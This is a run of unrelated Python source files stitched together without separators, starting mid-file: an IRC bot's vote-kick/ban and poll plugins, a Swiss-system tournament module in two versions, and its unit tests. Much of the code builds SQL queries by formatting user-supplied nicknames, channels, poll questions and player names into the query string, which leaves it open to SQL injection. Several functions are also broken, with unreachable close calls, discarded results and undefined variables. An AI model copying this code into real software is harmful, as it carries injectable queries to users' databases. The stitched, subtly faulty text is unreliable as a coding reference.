#             conn.send("KICK {} {} :{}".format(chan, target, "You have been voted off the island."))
#         if 'ban' in action:
#             conn.send("MODE {} +b {}".format(chan, target))
#             conn.send("KICK {} {} :".format(chan, target, "You have been voted off the island."))
#         db.execute("DELETE FROM votes where chan='{}' and action='{}' and target like '{}'".format(chan,action,target))
#         db.commit()
#         return
#     else:
#         db.execute("insert or replace into votes(chan, action, target, voters, time) values(?,?,?,?,?)", (chan, action, target, voters, time.time()))
#         db.commit()
#         notice("Vote count to {} {}: {} / 4".format(action, target, votecount))
#         return

#!/usr/bin/env python
#
# tournament.py -- implementation of a Swiss-system tournament
#

import psycopg2


def connect():
    """Connect to the PostgreSQL database.  Returns a database connection."""
    return psycopg2.connect("dbname=tournament")


def deleteMatches():
    """Remove all the match records from the database."""
    conn = connect()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM matches;")
    conn.commit()
    conn.close()


def deletePlayers():
    """Remove all the player records from the database."""
    conn = connect()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM players;")
    conn.commit()
    conn.close()


def countPlayers():
    """Returns the number of players currently registered."""
    conn = connect()
    cursor = conn.cursor()
    cursor.execute("SELECT count(*) FROM players;")
    results = cursor.fetchone()
    return results[0]
    conn.close()



def registerPlayer(name):
    """Adds a player to the tournament database.

    The database assigns a unique serial id number for the player.  (This
    should be handled by your SQL database schema, not in your Python code.)

    Args:
      name: the player's full name (need not be unique).
    """
    conn = connect()
    cursor = conn.cursor()
    cursor.execute("INSERT INTO players (name) VALUES ('%s')" % (name,));                    
    conn.commit()
    conn.close()


def playerStandings():
    """Returns a list of the players and their win records, sorted by wins.

    The first entry in the list should be the player in first place, or a player
    tied for first place if there is currently a tie.

    Returns:
      A list of tuples, each of which contains (id, name, wins, matches):
        id: the player's unique id (assigned by the database)
        name: the player's full name (as registered)
        wins: the number of matches the player has won
        matches: the number of matches the player has played
    """

    conn = connect()
    cursor = conn.cursor()
    cursor.execute("SELECT player_name_id.player_id as player_id, player_name_id.name as player_name, wins_count.wins_count, players_matches_counts.matches_count FROM player_name_id, wins_count, players_matches_counts WHERE player_name_id.player_id = wins_count.player_id and player_name_id.player_id = players_matches_counts.player_id ORDER BY wins_count DESC;")
    results = cursor.fetchall()
    answer = []
    for result in results:
        print "answer", answer                    
        answer + result
    return answer
    conn.close()

def reportMatch(winner, loser):
    """Records the outcome of a single match between two players.

    Args:
      winner:  the id number of the player who won
      loser:  the id number of the player who lost
    """
    conn = connect()
    cursor = conn.cursor()
    cursor.execute("INSERT INTO playsRecord (winner, loser) VALUES ('%s', '%s')" % (winner, loser));                    
    conn.commit()
    conn.close()


def swissPairings():
    """Returns a list of pairs of players for the next round of a match.

    Assuming that there are an even number of players registered, each player
    appears exactly once in the pairings.  Each player is paired with another
    player with an equal or nearly-equal win record, that is, a player adjacent
    to him or her in the standings.

    Returns:
      A list of tuples, each of which contains (id1, name1, id2, name2)
        id1: the first player's unique id
        name1: the first player's name
        id2: the second player's unique id
        name2: the second player's name
    """



from util import hook, user, database
import time

db_ready = False

def db_init(db):
    global db_ready
    db.execute("CREATE TABLE if not exists votes(chan, action, target, voters, time, primary key(chan, action, target));")
    db.commit()
    db_ready = True

def process_vote(target,action,chan,mask,db,notice,conn):
    if ' ' in target: 
        notice('Invalid nick')
        return

    try: votes2kick = database.get(db,'channels','votekick','chan',chan)
    except: votes2kick = 10
    try: votes2ban = database.get(db,'channels','voteban','chan',chan)
    except: votes2ban = 10

    if len(target) is 0:
        if action is 'kick': notice('Votes required to kick: {}'.format(votes2kick))
        elif action is 'ban': notice('Votes required to ban: {}'.format(votes2ban))
        return

    votefinished = False
    global db_ready
    if not db_ready: db_init(db)
    chan = chan.lower()
    target = target.lower()
    voter = user.format_hostmask(mask)
    voters = db.execute("SELECT voters FROM votes where chan='{}' and action='{}' and target like '{}'".format(chan,action,target)).fetchone()                    

    if conn.nick.lower() in target: return "I dont think so Tim."

    if voters: 
        voters = voters[0]
        if voter in voters: 
            notice("You have already voted.")
            return
        else:
            voters = '{} {}'.format(voters,voter).strip()
            notice("Thank you for your vote!")
    else: 
        voters = voter

    votecount = len(voters.split(' '))

    if 'kick' in action: 
        votemax = int(votes2kick)
        if votecount >= votemax:
            votefinished = True
            conn.send("KICK {} {} :{}".format(chan, target, "You have been voted off the island."))
    if 'ban' in action:
        votemax = int(votes2ban)
        if votecount >= votemax:
            votefinished = True
            conn.send("MODE {} +b {}".format(chan, user.get_hostmask(target,db)))
            conn.send("KICK {} {} :".format(chan, target, "You have been voted off the island."))
    
    if votefinished: db.execute("DELETE FROM votes where chan='{}' and action='{}' and target like '{}'".format(chan,action,target))                    
    else: db.execute("insert or replace into votes(chan, action, target, voters, time) values(?,?,?,?,?)", (chan, action, target, voters, time.time()))
        
    db.commit()
    return ("Votes to {} {}: {}/{}".format(action, target, votecount,votemax))



@hook.command(autohelp=False)
def votekick(inp, nick=None, mask=None, conn=None, chan=None, db=None, notice=None):
    return process_vote(inp,'kick',chan,mask,db,notice,conn)


@hook.command(autohelp=False)
def voteban(inp, nick=None, mask=None, conn=None, chan=None, db=None, notice=None):
    return process_vote(inp,'ban',chan,mask,db,notice,conn)


# UPVOTE
 

 # @hook.command(autohelp=False)
# def vote(inp, nick=None, mask=None,conn=None, chan=None, db=None, notice=None):
#     global db_ready
#     if not db_ready: db_init(db)
#     chan = chan.lower()
#     action = inp.split(" ")[0].lower()
#     target = inp.split(" ")[1].lower()
#     voter = user.format_hostmask(mask)
#     voters = db.execute("SELECT voters FROM votes where chan='{}' and action='{}' and target like '{}'".format(chan,action,target)).fetchone()                    

#     if voters: 
#         voters = voters[0]
#         if voter in voters: 
#             notice("You have already voted.")
#             return
#         else:
#             voters = '{} {}'.format(voters,voter).strip()
#             notice("Thank you for your vote!")
#     else: 
#         voters = voter

#     votecount = len(voters.split(' '))

#     if votecount >= 4: 
#         if 'kick' in action: 
#             conn.send("KICK {} {} :{}".format(chan, target, "You have been voted off the island."))
#         if 'ban' in action:
#             conn.send("MODE {} +b {}".format(chan, target))
#             conn.send("KICK {} {} :".format(chan, target, "You have been voted off the island."))
#         db.execute("DELETE FROM votes where chan='{}' and action='{}' and target like '{}'".format(chan,action,target))
#         db.commit()
#         return
#     else:
#         db.execute("insert or replace into votes(chan, action, target, voters, time) values(?,?,?,?,?)", (chan, action, target, voters, time.time()))
#         db.commit()
#         notice("Vote count to {} {}: {} / 4".format(action, target, votecount))
#         return

from util import hook, http
import time

# TODO: poll timer support

db_ready = False

def db_init(db):
    "check to see that our db has the the seen table and return a connection."
    """Implements a poll system."""
    db.execute('''create table if not exists polls (
              pollID int auto_increment primary key,
              question text,
              active bool )''')
    db.execute('''create table if not exists answers (
              answerID int auto_increment primary key,
              pollID int,
              'index' int,
              answer text,
              unique(pollID, 'index') )''')
    db.execute('''create table if not exists votes (
              voteID int auto_increment primary key,
              answerID int,
              nick varchar(255) )''')
    db.commit()
    print "Created Database"
    db_ready = True

# def load():
    
    # registerFunction("open poll %S", openPoll, "open poll <question>", restricted = True)
    # registerFunction("close poll", closePoll, restricted = True)
    # registerFunction("show poll %!i", showPoll, "show poll [poll ID]")
    # registerFunction("vote for %i", voteFor, "vote for <answer ID>")
    # registerFunction("vote new %S", voteNew, "vote new <answer>")
    # registerFunction("search poll %S", searchPoll, "search poll <search term>")
    # registerFunction("delete poll %i", deletePoll, "delete poll <poll ID>", restricted = True)
    # registerModule("Poll", load)


@hook.command(adminonly=True)
def openPoll(question, reply=None, db=None):
    """Creates a new poll."""
    if not db_ready: db_init(db)
    try:
        active = db.execute("SELECT pollID FROM polls WHERE active = 1").fetchone()[0]
        if active: 
            reply("There already is an open poll.")
            return
    except:
        db.execute("INSERT INTO polls (question, active) VALUES ('{}', 1)".format(question))                    
        reply("Opened new poll: {}".format(question))
        #reply("Poll opened!")
    return


@hook.command(adminonly=True, autohelp=False)
def closePoll(inp, reply=None, db=None):
    """Closes the current poll."""
    if not db_ready: db_init(db)
    active = db.execute("SELECT pollID FROM polls WHERE active = 1")
    if not active[0]:
        reply("No poll is open at the moment.")
        return
    reply("Pool's closed.")
    for (answer, votes) in db.execute("SELECT answer, count(voteID) FROM polls INNER JOIN answers ON answers.pollID = polls.pollID LEFT JOIN votes ON votes.answerID = answers.answerID WHERE active = 1 GROUP BY answers.answerID, answer ORDER BY count(voteID) DESC LIMIT 1"):
        reply("Winning entry: '%s' with %s votes" % (answer, votes))
    db.execute("UPDATE polls SET active = 0")


@hook.command(autohelp=False)
def showPoll(pollID, db=None):
    """Shows the answers for a given poll."""
    if not db_ready: db_init(db)
    if pollID == None:
        poll = db.execute("SELECT pollID, question FROM polls WHERE active = 1")
        if len(poll) == 0:
            reply("There's no poll open.")
            return
    else:
        poll = db.execute("SELECT pollID, question FROM polls WHERE pollID = '{}'".format(pollID))                    
        if len(poll) == 0:
            reply("No such poll found.")
            return
    pollID = poll[0][0]
    question = poll[0][1]
    reply(question)
    for (index, answer, votes) in db.execute("SELECT 'index', answer, count(voteID) FROM answers LEFT JOIN votes ON votes.answerID = answers.answerID WHERE pollID = {} GROUP BY answers.answerID, 'index', answer ORDER BY 'index' ASC".format(pollID, )):                    
        reply("%s. %s (%s)" % (index, answer, votes))


@hook.command
def voteFor(answerIndex, reply=None, db=None):
    """Casts a vote for the current poll."""
    if not db_ready: db_init(db)
    polls = db.execute("SELECT pollID FROM polls WHERE active = 1")
    if len(polls) == 0:
        reply("No poll is open at the moment.")
        return
    pollID = polls[0][0]
    answers = db.execute("SELECT answerID FROM answers WHERE pollID = %s AND 'index' = %s" % (pollID, answerIndex))                    
    if len(answers) == 0:
        reply("No item #%s found." % answerIndex)
        return
    answerID = answers[0][0]
    db.execute("DELETE FROM votes WHERE nick = %s AND answerID IN (SELECT answerID FROM answers WHERE pollID = %s)", (sender, pollID))                    
    db.execute("INSERT INTO votes (answerID, nick) VALUES (%s, %s)", (answerID, sender))                    
    reply("Vote registered.")


@hook.command
def voteNew(answer, reply=None, db=None):
    """Creates a new possible answer for the current poll and votes for it."""
    if not db_ready: db_init(db)
    polls = db.execute("SELECT pollID FROM polls WHERE active = 1")
    if len(polls) == 0:
        reply("No poll is open at the moment.")
        return
    pollID = polls[0][0]
    maxIndex = db.execute("SELECT MAX('index') FROM answers WHERE answers.pollID = %s", pollID)[0][0]                    
    if maxIndex == None:
        index = 1
    else:
        index = maxIndex + 1
    db.execute("INSERT INTO answers (pollID, 'index', answer) VALUES (%s, %s, %s)", (pollID, index, answer))                    
    answerID = db.execute("SELECT answerID FROM answers WHERE pollID = %s AND 'index' = %s", (pollID, index))[0][0]                    
    db.execute("DELETE FROM votes WHERE nick = %s AND answerID IN (SELECT answerID FROM answers WHERE pollID = %s)", (sender, pollID))                    
    db.execute("INSERT INTO votes (answerID, nick) VALUES (%s, %s)", (answerID, sender))                    
    reply("Vote added.")


@hook.command
def searchPoll(searchTerm, reply=None, db=None):
    """Search polls matching a given search term."""
    if not db_ready: db_init(db)
    polls = db.execute("SELECT pollID, question FROM polls WHERE question LIKE %s", ('%' + searchTerm + '%',))                    
    if len(polls) == 0:
        reply("No polls found.")
        return
    if len(polls) > 3:
        reply("%s entries found, refine your search" % len(polls))
        return
    for (pollID, question) in polls:
        winners = db.execute("SELECT answer, count(voteID) FROM answers INNER JOIN votes ON votes.answerID = answers.answerID WHERE pollID = %s GROUP BY answers.answerID, answer ORDER BY count(voteID) DESC LIMIT 1", (pollID, ))                    
        if len(winners) == 0:
            reply("%s. %s" % (pollID, question))
        else:
            reply("%s. %s -- Winner: %s (%s)" % (pollID, question, winners[0][0], winners[0][1]))


@hook.command(adminonly=True)
def deletePoll(pollID, reply=None, db=None):
    """Deletes a poll from the archives."""
    if not db_ready: db_init(db)
    if len(db.execute("SELECT pollID FROM polls WHERE pollID = %s", (pollID, ))) == 0:                    
        reply("No such poll found")
    db.execute("DELETE FROM votes WHERE answerID IN (SELECT answerID FROM answers WHERE pollID = %s)", (pollID, ))                    
    db.execute("DELETE FROM answers WHERE pollID = %s", (pollID, ))                    
    db.execute("DELETE FROM polls WHERE pollID = %s", (pollID, ))                    
    reply("Poll deleted.")



#!/usr/bin/env python

""" The master Unit test set up. Each set of tests below should cover all
functional aspects of tournament.py. The original file tournament_test.py has
been rolled in here and its tests exist below. Most tests below are YAY/NAY
in that we're expecitng very specific results. In most cases, each function
in tournament.py returns a status code based on its behavior. These codes are
returned when non-critical events take place such as "no players found" when
trying to search for players.
"""

import time
import unittest
import psycopg2
import tournament
import tools


def connect():
    # Connect to the PostgreSQL tools.  Returns a database connection.
    return psycopg2.connect(database='tournament', user='postgres')


def drop():
    co = connect()
    cu = co.cursor()
    cu.execute("DROP TABLE IF EXISTS players CASCADE;")
    cu.execute("DROP TABLE IF EXISTS matches CASCADE;")
    co.commit()
    cu.close()
    co.close()
    return 0


def truncate(table):
    co = connect()
    cu = co.cursor()
    cu.execute("TRUNCATE " + table + ";")
    co.commit()
    cu.close()
    co.close()


# Create database contents
def create():
    co = connect()
    cu = co.cursor()
    cu.execute("CREATE TABLE players(id serial NOT NULL,"
               "name text NOT NULL, country text "
               "NOT NULL, code text, CONSTRAINT players_pkey PRIMARY KEY (id))"
               "WITH (OIDS=FALSE);")
    cu.execute("ALTER TABLE players OWNER TO postgres;")
    cu.execute("CREATE TABLE matches (id serial NOT NULL, "
               "p1 text NOT NULL, p2 "
               "text NOT NULL, "
               "\"timestamp\" text NOT NULL,"
               "CONSTRAINT matches_pkey PRIMARY KEY (id))"
               "WITH (OIDS=FALSE);")
    cu.execute("ALTER TABLE matches OWNER TO postgres;")
    co.commit()
    cu.close()
    co.close()
    return 0


def create_dummy_data():
    drop()
    tools.bulksql(open("sql/data.sql", "r").read())


def dummy_player(player_name="", country=""):
    s = tournament.registerPlayer(player_name=player_name, country=country)
    return s


class TestCreateDatabaseTable(unittest.TestCase):
    def test_connect_to_database(self):
        """test connection to database 'tournament'"""
        connect()

    def test_drop_database_tables_if_exist(self):
        """setup process: drop tables from database if they exist"""
        self.assertEqual(drop(), 0)

    def test_create_database_tables(self):
        """create database tables 'players', 'matches'"""
        self.assertEqual(drop(), 0)
        self.assertEqual(create(), 0)


class TestMainDatabaseConnector(unittest.TestCase):
    def test_connect_to_database(self):
        """test connection to database 'tournament'"""
        tools.connect()


class BaseTestCase(unittest.TestCase):
    """Base TestCase class, sets up a CLI parser"""
        
    @classmethod
    def setUpClass(cls):
        parser = tournament.argument_parser()
        cls.parser = parser


class TestVerifyCheckVersionMessage(BaseTestCase):
    def test_wait_time(self):
        """check_version() is waiting the correct time (3.0s)"""
        start = time.time()
        tournament.check_version((2, 4))
        end = time.time()
        count = round(end - start, 1)
        self.assertEqual(count, 3.0)


class TestVerifyVersionTooLowStatusReportSuccess(BaseTestCase):
    def test_older_python_version(self):
        """check_version() 1 if out of spec"""
        self.assertEqual(tournament.check_version((2, 4)), 1)

    def test_same_python_version(self):
        """check_version() 0 if in spec for same version"""
        self.assertEqual(tournament.check_version((2, 7)), 0)

    def test_newer_python_version(self):
        """check_version() 0 if in spec for same version"""
        self.assertEqual(tournament.check_version((2, 9)), 0)

    def test_newer_python3_version(self):
        """check_version() 0 if in spec for same version"""
        self.assertEqual(tournament.check_version((3, 4)), 0)


class TestCommandLineArguments(BaseTestCase):
    def test_arg_new_player(self):
        """Script should reject if --new-player argument is empty"""
        with self.assertRaises(SystemExit):
            self.parser.parse_args(["--new-player"])

    def test_arg_edit_player(self):
        """Script should reject if --edit-player argument is empty"""
        with self.assertRaises(SystemExit):
            self.parser.parse_args(["--edit-player"])

    def test_arg_delete_player(self):
        """Script should reject if --edit-player argument is empty"""
        with self.assertRaises(SystemExit):
            self.parser.parse_args(["--delete-player"])

    def test_arg_delete_match(self):
        """Script should reject if --edit-player argument is empty"""
        with self.assertRaises(SystemExit):
            self.parser.parse_args(["--delete-match"])


class TestNewPlayer(BaseTestCase):
    def test_name_contains_integer(self):
        """registerPlayer() should reject if name contains integer"""
        with self.assertRaises(AttributeError):
            tournament.registerPlayer(player_name="1")

    def test_name_less_two_characters(self):
        """registerPlayer() should reject if name is less than two characters"""
        with self.assertRaises(AttributeError):
            tournament.registerPlayer(player_name="a")

    def test_name_contains_symbols(self):
        """registerPlayer() should reject if name contains symbols"""
        with self.assertRaises(AttributeError):
            tournament.registerPlayer(player_name="J!mes Dean")

    def test_name_first_and_last(self):
        """registerPlayer() should reject if both a first and last name aren't
        present"""
        with self.assertRaises(AttributeError):
            tournament.registerPlayer(player_name="James")

    def test_player_has_three_word_name(self):
        """registerPlayer() should return 0 if player is given a middle name"""
        self.assertEqual(0, dummy_player(player_name="James Dean Rogan",
                                         country="United States"))

    def test_country_not_provided(self):
        """registerPlayer() should return 0 if player is given a middle name"""
        with self.assertRaises(SystemExit):
            dummy_player(player_name="James Rogan", country="")

    def test_add_new_player(self):
        """registerPlayer() should return 0 if adding new player was successful"""
        self.assertEqual(0, dummy_player(player_name="Christoph Waltz",
                                         country="Germany"))


class TestEditPlayer(BaseTestCase):
    def setUp(self):
        create_dummy_data()

    def test_option_edit(self):
        """editPlayer() edits player with new info provided"""
        q = "SELECT * FROM matches ORDER BY id LIMIT 1"
        r = tools.query(q)
        s = str(r[0][0])
        self.assertEquals(tournament.editPlayer(player=s,
                                                 new_name="Johan Bach",
                                                 new_country="Guam"), 0)

    def test_option_delete(self):
        """editPlayer() deletes player"""
        q = "SELECT * FROM matches ORDER BY id LIMIT 1"
        r = tools.query(q)
        s = str(r[0][0])
        self.assertEquals(tournament.deletePlayer(player=s), 0)

    def test_edit_missing_new_info(self):
        """editPlayer() throws when both new_name and new_country are not
        specified"""
        with self.assertRaises(AttributeError):
            tournament.editPlayer(new_name="Joan Jett")

    def test_no_player_id(self):
        """Script should reject if --edit-player argument is empty"""
        with self.assertRaises(SystemExit):
            self.parser.parse_args(["--edit-player"])

    def test_delete_invalid_player_id(self):
        """editPlayer() should throw if the player ID is invalid"""
        with self.assertRaises(LookupError):
            tournament.deletePlayer(player="38471237401238")                    

    def test_edit_invalid_player_id(self):
        """editPlayer() should throw if the player ID is invalid"""
        with self.assertRaises(LookupError):
            tournament.editPlayer(player="38471237401238",                    
                                   new_name="Michael Bay", new_country="Japan")


class TestListPlayers(BaseTestCase):
    def setUp(self):
        create_dummy_data()

    def test_display_zero_matches(self):
        """list_players() returns 1 if the tournament.Players table is empty"""
        q = "TRUNCATE TABLE players;"
        tools.query(q)
        self.assertEqual(tournament.list_players(), 1)

    def test_list_players(self):
        """list_players() returns 0 if it works."""
        dummy_player(player_name="Mark German", country="Germany")
        self.assertEqual(tournament.list_players(), 0)


class TestNewMatch(BaseTestCase):
    def setUp(self):
        create_dummy_data()
        
    def test_less_than_two_players(self):
        """reportMatch() throws if both players are not provided"""
        with self.assertRaises(AttributeError):
            tournament.reportMatch(p1=9, p2="")
        
    def test_p1_not_valid(self):
        """reportMatch() throws if player 1 is not valid"""
        q = "TRUNCATE TABLE players;"
        tools.query(q)
        self.assertEqual(dummy_player(player_name="Double Quarder",
                                      country="Playland"), 0)
        q = "SELECT * FROM matches ORDER BY id LIMIT 1"
        p = tools.query(q)
        i1 = p[0][0]
        self.assertEqual(dummy_player(player_name="Big Mac Sauce",
                                      country="Playland"), 0)
        q = "SELECT * FROM matches ORDER BY id LIMIT 1"
        p = tools.query(q)
        i2 = str(p[0][0])
        i1 = str(i1 + 2)
        with self.assertRaises(LookupError):
            tournament.reportMatch(p1=i1, p2=i2)
        
    def test_p2_not_valid(self):
        """reportMatch() throws if player 2 is not valid"""
        q = "TRUNCATE TABLE players;"
        tools.query(q)
        self.assertEqual(dummy_player(player_name="Fissh Fillay",
                                      country="Playland"), 0)
        q = "SELECT * FROM matches ORDER BY id LIMIT 1"
        p = tools.query(q)
        i1 = str(p[0][0])
        self.assertEqual(dummy_player(player_name="Kulv Sangwich",
                                      country="Playland"), 0)
        q = "SELECT * FROM matches ORDER BY id LIMIT 1"
        p = tools.query(q)
        i2 = p[0][0]
        i2 = str(i2 + 2)
        with self.assertRaises(LookupError):
            tournament.reportMatch(p1=i1, p2=i2)
        
    def test_p1_contains_letter(self):
        """reportMatch() throws if player 1 ID contains letter"""
        with self.assertRaises(AttributeError):
            tournament.reportMatch(p1="A", p2=1)
        
    def test_p1_contains_symbol(self):
        """reportMatch() throws if player 1 ID contains symbol"""
        with self.assertRaises(AttributeError):
            tournament.reportMatch(p1="$", p2=1)
        
    def test_p2_contains_letter(self):
        """reportMatch() throws if player 2 ID contains letter"""
        with self.assertRaises(AttributeError):
            tournament.reportMatch(p1=2, p2="A")
        
    def test_p2_contains_symbol(self):
        """reportMatch() throws if player 2 ID contains symbol"""
        with self.assertRaises(AttributeError):
            tournament.reportMatch(p1=2, p2="%")


class TestSwissMatching(BaseTestCase):
    def setUp(self):
        create_dummy_data()

    def test_no_players(self):
        """swissPairings() throws if there are no players in the database"""
        q = "TRUNCATE TABLE players;"
        tools.query(q)
        with self.assertRaises(ValueError):
            tournament.swissPairings()


class TestLatestMatch(BaseTestCase):
    def setUp(self):
        create_dummy_data()

    def test_latest_match(self):
        """latest_match() function executes without issue"""

    def test_latest_match_not_found(self):
        """latestMatch() throws SystemExit when no match is found"""


class TestListWinRanking(BaseTestCase):
    def setUp(self):
        create_dummy_data()

    def test_list_win_ranking(self):
        """playerStandings() function executes without issue"""
        self.assertTrue(tournament.playerStandings())



if __name__ == '__main__':
    unittest.main(verbosity=3, buffer=True)


#!/usr/bin/env python

"""
TOURNAMENT MATCHUP APPLICATION
 Simulates 1-on-1 matchups and swiss ranked matches. Queries a pgSQL database
 for match and player information.
"""

import argparse as arg
import config as cfg
import datetime
from decimal import Decimal
from prettytable import PrettyTable
import psycopg2
import random
import re
import sys
import time
import tools


def check_version(sys_version):
    """
    Let's check to make sure the user is running at least Python 2.7. Since
    this app was coded with that version, it would make sense.
    """
    # Check if python version is less than 2.7
    if sys_version < (2, 7):
        # if so, let the user know.
        message = "Version out of spec."
        print message
        time.sleep(3.0)  # Wait before proceeding through the app.
        verstat = 1
    else:
        verstat = 0
    return verstat


def connect():
    # Connect to the PostgreSQL database.  Returns a database connection.
    return psycopg2.connect(database=cfg.DATABASE_NAME,
                            user=cfg.DATABASE_USERNAME,
                            password=cfg.DATABASE_PASSWORD)


def registerPlayer(player_name="", country=""):
    """
    Create a new player based on their name and country of origin. We expect
    the following:
    - Player Name
    - Player Country of Origin
    """
    connection = connect()
    cursor = connection.cursor()
    # check for numbers in player name
    if re.search('[0-9]', player_name):
        raise AttributeError("Player name is invalid (contains numbers)")
    # check if player name is shorter than 2 char.
    if len(player_name) < 2:
        raise AttributeError("Player name is less than 2 characters.")
    # player name is missing surname
    if " " not in player_name:
        raise AttributeError("Player name is invalid. (missing surname)")
    # player name shouldn't contain symbols
    if re.search('[!@#$%^&*\(\)~`+=]', player_name):
        raise AttributeError("Player name is invalid. (contains symbol(s))")
    # if a country isn't provided.
    if not country:
        raise SystemExit("Country of Origin Not Provided.")
    print "Creating new entry for %s from %s" % (player_name, country)
    code = player_name[:4].lower() + str(random.randrange(1000001, 9999999))
    start = time.time()
    # Unlike other queries in this app, we don't use the % symbol,
    # which allows psycopg2 to auto-escape any crazy single-quote-containing
    # names. This way, one can add all the O'Malleys and O'Neals they desire!
    cursor.execute("INSERT INTO players (name, country, code) "
                   "VALUES (%s, %s, %s);", (player_name, country,
                                                         code))
    stop = time.time()
    # Using the start and stop time values above, we can print out how long
    # it took to complete this action.
    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),
                                                    rounding="ROUND_UP"))
    print "Successfully created new entry in %s seconds" % dur[:5]
    connection.commit()
    cursor.close()
    connection.close()
    return 0


def deletePlayer(player=""):
    """
    Delete an existing player based on their ID. We expect the following:
    - Option (edit or delete)
    - Player ID
    - New Player Name (if edit)
    - New Country of Origin (if edit)
    """
    connection = connect()
    cursor = connection.cursor()
    start = time.time()
    player = str(player)
    cursor.execute("SELECT * FROM players WHERE id=%s", (player,))
    search = cursor.fetchall()
    # if player ID wasn't found in search, raise an exception.
    if not search:
        raise LookupError("Invalid Player ID or ID Not Found.")
    cursor.execute("DELETE FROM players WHERE id = %s", (player,))
    stop = time.time()
    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),
                                                    rounding="ROUND_UP"))
    print "Complete. Operation took %s seconds." % dur[:5]
    connection.commit()
    cursor.close()
    connection.close()
    return 0


def deletePlayers():
    """Deletes ALL players from the database."""
    connection = connect()
    cursor = connection.cursor()
    start = time.time()
    # empty the players table
    cursor.execute("TRUNCATE players;")
    stop = time.time()
    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),
                                                    rounding="ROUND_UP"))
    print "Complete. Operation took %s seconds." % dur[:5]
    connection.commit()
    cursor.close()
    connection.close()
    return 0


def editPlayer(player="", new_name="", new_country=""):
    """Edit a player in the database, based on 'player',
    and using 'new_name' and 'new_country'."""
    connection = connect()
    cursor = connection.cursor()
    # if both a name and country aren't provided, raise an exception.
    if not (new_name and new_country):
        raise AttributeError("New Information Not Provided.")
    player_name = new_name
    player_country = new_country
    start = time.time()
    cursor.execute("SELECT * FROM players WHERE id=%s", (player,))
    search = cursor.fetchall()
    # if player ID wasn't found in search, raise an exception.
    if not search:
        raise LookupError("Invalid Player ID.")
    cursor.execute("UPDATE players "
                   "SET name=%s, country=%s "
                   "WHERE id=%s", (player_name, player_country, player))
    stop = time.time()
    dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),
                                                    rounding="ROUND_UP"))
    print "Complete. Operation took %s seconds." % dur[:5]
    connection.commit()
    cursor.close()
    connection.close()
    return 0


def list_players():
    """
    Get a list of players based on criteria and display method.
    We expect the following:
    - Limit to display
    """
    connection = connect()
    cursor = connection.cursor()
    print "List All Players."
    cursor.execute("SELECT * FROM players;")
    results = cursor.fetchall()
    count = 0
    if not results:  # if there aren't any players
        print "No players found."
        status = 1
    else:
        print "Here's a list of all players in the database: "
        start = time.time()
        # Start building the output table.
        table = PrettyTable(['ID', 'NAME', 'COUNTRY'])
        table.align = 'l' # left-align the table contents.
        # Loop through the data and generate a table row for each iteration.
        for row in results:
            count += 1
            table.add_row([row[0], row[1], row[2]])
        # Finally, print the table.
        print table
        stop = time.time()
        dur = str(Decimal(float(stop - start)).quantize(Decimal('.01'),
                                                        rounding="ROUND_UP"))
        print "Returned %s results in %s seconds" % (count, dur[:5])
        connection.commit()
        cursor.close()
        connection.close()
        status = 0
    return status


def reportMatch(p1="", p2=""):
    """
    Initiate a match. We expect the following:
    - ID of Player 1
    - ID of Player 2
    """
    connection = connect()
    cursor = connection.cursor()
    p1_code = ''
    p2_code = ''
    p1_name = ''
    p2_name = ''
    # if both players aren't provided
    if not (p1 and p2):
        raise AttributeError("Both player IDs need to be provided.")
    # if player 1's ID contains one or more letters
    if re.search('[A-Za-z]', str(p1)):
        raise AttributeError("Player 1 ID contains letter(s).")
    # if player 2's ID contains one or more letters
    if re.search('[A-Za-z]', str(p2)):
        raise AttributeError("Player 2 ID contains letter(s).")
    # if player 1's ID contains one or more symbols
    if re.search('[!@#$%^&*\(\)~`+=]', str(p1)):
        raise AttributeError("Player 1 ID is invalid. (contains symbol(s))")
    # if player 2's ID contains one or more symbols
    if re.search('[!@#$%^&*\(\)~`+=]', str(p2)):
        raise AttributeError("Player 2 ID is invalid. (contains symbol(s))")
    cursor.execute("SELECT * FROM players WHERE id=%s", (p1,))
    code_lookup = cursor.fetchall()
    if not code_lookup:  # if player 1 can't be found
        raise LookupError("Player 1 ID does not exist.")
    # Correlate a player's unique code to their name
    for row in code_lookup:
        p1_code = row[3]
        cursor.execute("SELECT * FROM players "
                                     "WHERE code=\'%s\'", (p1_code,))
        player_name = cursor.fetchall()
        for result in player_name:
            p1_name = result[1]
    cursor.execute("SELECT * FROM players WHERE id=%s", (p2,))
    code_lookup = cursor.fetchall()
    if not code_lookup:  # if player 2 can't be found
        raise LookupError("Player 2 ID does not exist.")
    # and again for player 2
    for row in code_lookup:
        p2_code = row[3]
        cursor.execute("SELECT * FROM players "
                                     "WHERE code=\'%s\'", (p2_code,))
        cursor.execute("SELECT * FROM players WHERE id=%s", (p2,))
        player_name = cursor.fetchall()
        for result in player_name:
            p2_name = result[1]
    print "%s vs. %s... " % (p1_name, p2_name),
    if (not p1_name) or (not p2_name):
        raise ValueError("One of the two players you entered doesn't exist.")
    # In this world, the first player always wins. One could call this
    # function and randomly choose who's is first position in order to make
    # it fair.
    winner = p1_code
    loser = p2_code
    print "Winner: %s" % p1_name
    ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
    cursor.execute("INSERT INTO matches (player_1, player_2, "
                   "timestamp) "
                   "VALUES (\'%s\', \'%s\', \'%s\');", (winner, loser, ts))
    connection.commit()
    cursor.close()
    connection.close()
    status = 0
    return status


def swissPairings():
    """
    match up each of the players in the database and swiss-ify them.
    """
    connection = connect()
    cursor = connection.cursor()
    bye = ''
    player_pairs = []
    round_number = 0
    start = time.time()
    cursor.execute("SELECT * FROM players;")
    players_list = cursor.fetchall()
    # Count the number of players in the list
    count = len(players_list)
    if count == 0:
        raise ValueError("No players found.")
    # If there isn't an even amount:
    if count % 2:
        print count
        # simple math.
        bye = players_list[count - 1]
        players_list.pop(random.randrange(0,count))
        print len(players_list)
    """ Since it's technically pure coincidence that the entries were in order,
    we need to explicitly sort them. Defaults to the ID for sorting as it's
    the first non-symbol in each entry.
    If we did the list organization in the database, it would require extra
    cycles in the code to get the data right. """

    players_list1 = players_list[:len(players_list)/2]
    players_list2 = players_list[len(players_list)/2:]
    # Flip the second dict; faster than using the reversed() builtin.
    tx = PrettyTable(["TEAM A", "TEAM B"])
    # some master table settings we need to declare for formatting purposes
    tx.align = "c"
